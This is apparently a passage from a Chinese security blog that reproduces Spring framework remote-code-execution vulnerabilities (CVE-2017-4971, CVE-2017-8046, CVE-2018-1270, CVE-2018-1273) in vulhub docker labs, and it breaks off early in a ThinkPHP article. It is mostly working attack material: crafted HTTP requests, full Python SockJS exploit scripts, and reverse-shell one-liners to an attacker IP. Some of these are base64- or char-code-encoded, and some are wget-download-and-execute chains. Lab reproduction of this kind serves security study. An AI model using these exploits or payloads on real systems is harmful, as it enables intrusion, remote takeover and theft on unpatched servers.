g.Character).toString(74)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功后</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090725948.png" alt="image-20210521090725948"></p><p>成功回显</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090738364.png" alt="image-20210521090738364"></p><h3 id="Spring-Web-Flow框架远程代码执行-CVE-2017-4971"><a href="#Spring-Web-Flow框架远程代码执行-CVE-2017-4971" class="headerlink" title="Spring Web Flow框架远程代码执行(CVE-2017-4971)"></a>Spring Web Flow框架远程代码执行(CVE-2017-4971)</h3><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">Spring WebFlow 2.4.0 - 2.4.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="触发漏洞需要的两个条件"><a href="#触发漏洞需要的两个条件" class="headerlink" title="触发漏洞需要的两个条件"></a>触发漏洞需要的两个条件</h4><pre class="line-numbers language-none"><code class="language-none">1.MvcViewFactoryCreator对象的 useSpringBeanBinding参数需要设置为 false（默认值）2.flow view对象中设置 BinderConfiguration对象为空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="漏洞搭建-1"><a href="#漏洞搭建-1" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>关闭之前的docker镜像</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094032174.png" alt="image-20210521094032174"></p><p>还是使用vulhub进行搭建</p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/spring/CVE-2017-4971sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094341522.png" alt="image-20210521094341522"></p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h4 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094412376.png" alt="image-20210521094412376"></p><p>用任意账号/密码登录系统</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094430216.png" alt="image-20210521094430216"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094611129.png" alt="image-20210521094611129"></p><p>然后访问id=1的酒店地址</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094725512.png" alt="image-20210521094725512"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521095055636.png" alt="image-20210521095055636"></p><p>然后进行抓包</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521095217172.png" alt="image-20210521095217172"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521095326142.png" alt="image-20210521095326142"></p><h4 id="Poc-反弹shell"><a href="#Poc-反弹shell" class="headerlink" title="Poc(反弹shell)"></a>Poc(反弹shell)</h4><pre class="line-numbers language-none"><code class="language-none">_(new java.lang.ProcessBuilder("bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.175.130/8888 0&gt;&amp;1")).start()=vulhubURL编码后：_(new java.lang.ProcessBuilder("bash","-c","bash+-i+&gt;%26+/dev/tcp/192.168.175.130/8888 0&gt;%261")).start()=vulhub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进行执行</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521101939418.png" alt="image-20210521101939418"></p><p>成功拿到反弹shell</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521101957457.png" alt="image-20210521101957457"></p><h4 id="EXP拓展"><a href="#EXP拓展" class="headerlink" title="EXP拓展"></a>EXP拓展</h4><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">&amp;_T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")或者&amp;_(new+java.lang.ProcessBuilder("touch /tmp/success2")).start()=test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521102426141.png" alt="image-20210521102426141"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521102447095.png" alt="image-20210521102447095"></p><p>远程下载脚本 并执行</p><pre class="line-numbers language-none"><code class="language-none">&amp;_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.175.130:8888/1")&amp;_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/1")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Spring-data-Rest远程命令执行命令-CVE-2017-8046"><a href="#Spring-data-Rest远程命令执行命令-CVE-2017-8046" class="headerlink" title="Spring data Rest远程命令执行命令(CVE-2017-8046)"></a>Spring data Rest远程命令执行命令(CVE-2017-8046)</h3><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><pre class="line-numbers language-none"><code class="language-none">Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3Spring Boot version &lt; 2.0.0M4Spring Data release trains &lt; Kay-RC3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞搭建-2"><a href="#漏洞搭建-2" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>关闭之前的docker镜像</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521102823896.png" alt="image-20210521102823896"></p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/spring/CVE-2017-8046sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103116167.png" alt="image-20210521103116167"></p><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103134848.png" alt="image-20210521103134848"></p><h4 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/customers/1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103330023.png" alt="image-20210521103330023"></p><p>进行抓包</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103417353.png" alt="image-20210521103417353"></p><p>修改成PATCH请求</p><h4 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h4><pre class="line-numbers language-none"><code class="language-none">PATCH /customers/1 HTTP/1.1Host: 192.168.175.209:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/json-patch+jsonContent-Length: 210[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行执行</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521104331898.png" alt="image-20210521104331898"></p><p>然后我们去docker底层看一下</p><p>可以看到是成功创建的</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521123013062.png" alt="image-20210521123013062"></p><h4 id="Poc原理-反弹shell"><a href="#Poc原理-反弹shell" class="headerlink" title="Poc原理+反弹shell"></a>Poc原理+反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">",".join(map(str, (map(ord,"touch /tmp/a001"))))'116,111,117,99,104,32,47,116,109,112,47,97,48,48,49'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521123140977.png" alt="image-20210521123140977"></p><p>反弹shell</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.175.130/8888 0&gt;&amp;1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124108717.png" alt="image-20210521124108717"></p><pre class="line-numbers language-none"><code class="language-none">",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124214334.png" alt="image-20210521124214334"></p><pre class="line-numbers language-none"><code class="language-none">98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,51,78,83,52,120,77,122,65,118,79,68,103,52,79,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行执行</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124336095.png" alt="image-20210521124336095"></p><p>成功反弹shell</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124346504.png" alt="image-20210521124346504"></p><h3 id="Spring-Messaging远程命令执行突破-CVE2018-1270"><a href="#Spring-Messaging远程命令执行突破-CVE2018-1270" class="headerlink" title="Spring Messaging远程命令执行突破(CVE2018-1270)"></a>Spring Messaging远程命令执行突破(CVE2018-1270)</h3><h4 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">Spring Framework 5.0 to 5.0.4.Spring Framework 4.3 to 4.3.14已经不支持的旧版本依然受到影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞搭建-3"><a href="#漏洞搭建-3" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><pre class="line-numbers language-none"><code class="language-none">cd sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522092202285.png" alt="image-20210522092202285"></p><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522092220807.png" alt="image-20210522092220807"></p><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/gs-guide-websocket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522092400364.png" alt="image-20210522092400364"></p><h4 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h4><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport jsonlogging.basicConfig(stream=sys.stdout, level=logging.INFO)def random_str(length):    letters = string.ascii_lowercase + string.digits    return ''.join(random.choice(letters) for c in range(length))class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'        self.daemon = True        self.session = requests.session()        self.session.headers = {            'Referer': url,            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'        }        self.t = int(time.time()*1000)    def run(self):        url = f'{self.base}/htmlfile?c=_jp.vulhub'        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)        def send(self, command, headers, body=''):        data = [command.upper(), '\n']        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))                data.append('\n\n')        data.append(body)        data.append('\x00')        data = json.dumps([''.join(data)])        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)        if response.status_code != 204:            logging.info(f"send '{command}' data error.")        else:            logging.info(f"send '{command}' data success.")    def __del__(self):        self.session.close()sockjs = SockJS('http://your-ip:8080/gs-guide-websocket')sockjs.start()time.sleep(1)sockjs.send('connect', {    'accept-version': '1.1,1.0',    'heart-beat': '10000,10000'})sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",    'id': 'sub-0',    'destination': '/topic/greetings'})data = json.dumps({'name': 'vulhub'})sockjs.send('send', {    'content-length': len(data),    'destination': '/app/hello'}, data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们这里要进行修改 所以Poc并不通用</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093127253.png" alt="image-20210522093127253"></p><p>一个是被攻击的IP</p><p>一个是执行的命令</p><p>一个是名字</p><p>进行修改后</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093214720.png" alt="image-20210522093214720"></p><p>进行执行</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093250917.png" alt="image-20210522093250917"></p><p>去docker底层查看执行是否成功</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093404508.png" alt="image-20210522093404508"></p><h4 id="Poc-2-反弹shell"><a href="#Poc-2-反弹shell" class="headerlink" title="Poc-2-反弹shell"></a>Poc-2-反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport jsonlogging.basicConfig(stream=sys.stdout, level=logging.INFO)def random_str(length):    letters = string.ascii_lowercase + string.digits    return ''.join(random.choice(letters) for c in range(length))class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'        self.daemon = True        self.session = requests.session()        self.session.headers = {            'Referer': url,            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'        }        self.t = int(time.time()*1000)    def run(self):        url = f'{self.base}/htmlfile?c=_jp.vulhub'        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)        def send(self, command, headers, body=''):        data = [command.upper(), '\n']        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))                data.append('\n\n')        data.append(body)        data.append('\x00')        data = json.dumps([''.join(data)])        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)        if response.status_code != 204:            logging.info(f"send '{command}' data error.")        else:            logging.info(f"send '{command}' data success.")    def __del__(self):        self.session.close()sockjs = SockJS('http://192.168.253.7:8080/gs-guide-websocket')sockjs.start()time.sleep(1)sockjs.send('connect', {    'accept-version': '1.1,1.0',    'heart-beat': '10000,10000'})sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1My42NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}')",    'id': 'sub-0',    'destination': '/topic/greetings'})data = json.dumps({'name': 'vulhub'})sockjs.send('send', {    'content-length': len(data),    'destination': '/app/hello'}, data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样也是需要修改的</p><p>上java编码的网站</p><pre class="line-numbers language-none"><code class="language-none">http://www.jackson-t.ca/runtime-exec-payloads.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="file://C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085321594.png?lastModify=1621647316" alt="image-20210521085321594"></p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.175.130/8888 0&gt;&amp;1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进行修改</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093745956.png" alt="image-20210522093745956"></p><p>执行poc</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093816453.png" alt="image-20210522093816453"></p><p>成功拿到反弹shell</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522093836061.png" alt="image-20210522093836061"></p><h3 id="Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273"><a href="#Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273" class="headerlink" title="Spring Data Commons远程命令执行漏洞(CVE-2018-1273)"></a>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</h3><h4 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">Spring Data Commons 1.13~1.13.10(Ingalls SR10)Spring Data REST 2.6~2.6.10(Ingalls SR10)Spring Data Commons 2.0~2.0.5(Kay SR5)Spring Data Rest 3.0~3.0 5(Kay SR5)较旧的不受支持的版本也会受到影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="漏洞搭建-4"><a href="#漏洞搭建-4" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/spring/CVE-2018-1273sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094338512.png" alt="image-20210522094338512"></p><h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094409667.png" alt="image-20210522094409667"></p><h4 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>进行抓包</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094709560.png" alt="image-20210522094709560"></p><h4 id="Poc-3"><a href="#Poc-3" class="headerlink" title="Poc"></a>Poc</h4><pre class="line-numbers language-none"><code class="language-none">POST /users?page=&amp;size=5 HTTP/1.1Host: 192.168.175.209:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 121Origin: http://192.168.175.209:8080Connection: closeReferer: http://192.168.175.209:8080/usersUpgrade-Insecure-Requests: 1username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/a001")]=&amp;password=&amp;repeatedPassword=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094845931.png" alt="image-20210522094845931"></p><p>执行之后呢 我们可以去docker底层看一下</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522094958191.png" alt="image-20210522094958191"></p><h4 id="Poc-2-反弹shell-1"><a href="#Poc-2-反弹shell-1" class="headerlink" title="Poc-2-反弹shell"></a>Poc-2-反弹shell</h4><p>bash反弹一句话</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095153542.png" alt="image-20210522095153542"></p><p>python开启http服务</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095232922.png" alt="image-20210522095232922"></p><p>上传sh脚本</p><pre class="line-numbers language-none"><code class="language-none">/usr/bin/wget -qO /tmp/a002 http://192.168.175.130:9999/shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行执行</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095354596.png" alt="image-20210522095354596"></p><p>然后继续去docker底层看一下</p><p>可以看到成功写入</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095552456.png" alt="image-20210522095552456"></p><p>然后进行执行sh脚本</p><pre class="line-numbers language-none"><code class="language-none">/bin/bash /tmp/a002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095701465.png" alt="image-20210522095701465"></p><p>成功拿到反弹shell</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522095743196.png" alt="image-20210522095743196"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Spring其中关键的5个部分，分别是 </p><pre class="line-numbers language-none"><code class="language-none">spring framework、springboot、spring cloud、spring security、spring mvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中的 spring framework就是大家常常提到的 spring，这是所有 sprIng内容最基本的底层架构，其包含 spring mvc、springboot、spring core、IOC和AOP等等</p><p>Spring mvc就是 spring中的一个MVC框架，主要用来开发web应用和网络接口，但是其使用之前需要配置大量的xml文件，比较繁琐</p><p>所以出现 springboot，其内置 tomcat并且内置默认的XML配置信息，从而方便了用户的使用。下图就直观表现了他们之间的关系</p><p>spring security主要是用来做鉴权，保证安全性的</p><p>Spring Cloud基于 Spring Boot，简化了分布式系统的开发，集成了服务发现、配置管理、消息总线、负载均衡、断路器、数据监控等各种服务治理能力整个 spring家族有四个重要的基本概念，分别是</p><pre class="line-numbers language-none"><code class="language-none">IOC:控制反转Context:上下文Bean:被Spring 容器管理的Java对象AOP:面向切面的编程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp小结</title>
      <link href="/2021/10/28/thinkphp/"/>
      <url>/2021/10/28/thinkphp/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为 ThinkPHP</p><p>它遵循 Apache2开源协议发布，从 Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了 Struts的思想和 TagLib(标签库)、RoR的ORM映射和 ActiveRecord模式。</p><p>ThinkPHP可在 Windows和 Linux等操作系统运行，支持 MySql，Sqlite和 PostgreSQL等多种数据库以及PDO扩展，是一款跨平台，跨版本以及简单易用的PHP框架。</p><p>同时ThinkPHP是一个免费开源用户数量非常多的一个PHP开发框架</p><h2 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h2><p>官网：<a href="http://www.thinkphp.cn/down.html">http://www.thinkphp.cn/down.html</a></p><p>经典的版本就是这四大类</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214430.png" alt="image-20210516101707716"></p><p>安装vc9_x86(必装)</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214431.png" alt="image-20210516102503058"></p><p>安装phpstudy-2016</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214432.png" alt="image-20210516102546033"></p><p>把Thinkphp的包搞到WWW目录下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214433.png" alt="image-20210516102800809"></p><p>这里要注意一下</p><p>默认的Thinkphp框架下是有<code>robots.txt</code>的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214434.png" alt="image-20210516102909994"></p><p>存在信息泄露的</p><p>写入的shell或者一句话 也是在这个目录下</p><pre class="line-numbers language-none"><code class="language-none">C:\phpStudy\WWW\a001\public<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后存放日志的目录 是这个</p><pre class="line-numbers language-none"><code class="language-none">C:\phpStudy\WWW\a001\thinkphp\library\think\log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214435.png" alt="image-20210516103104540"></p><p>要对外访问的嘛  所以要配置域名</p><p>这里要注意 目录要选到public目录下 这样才能识别到这个目录下的<code>router.php</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214436.png" alt="image-20210516103602494"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214437.png" alt="image-20210516104047481"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214438.png" alt="image-20210516103643043"></p><p>这里也可以不用IP </p><p>如果你没有用IP的话 就要去改一下hosts文件</p><p>然后新增 保存一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214439.png" alt="image-20210516103759492"></p><p>然后远程访问一下 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214440.png" alt="image-20210516103844729"></p><h2 id="本地漏洞复现"><a href="#本地漏洞复现" class="headerlink" 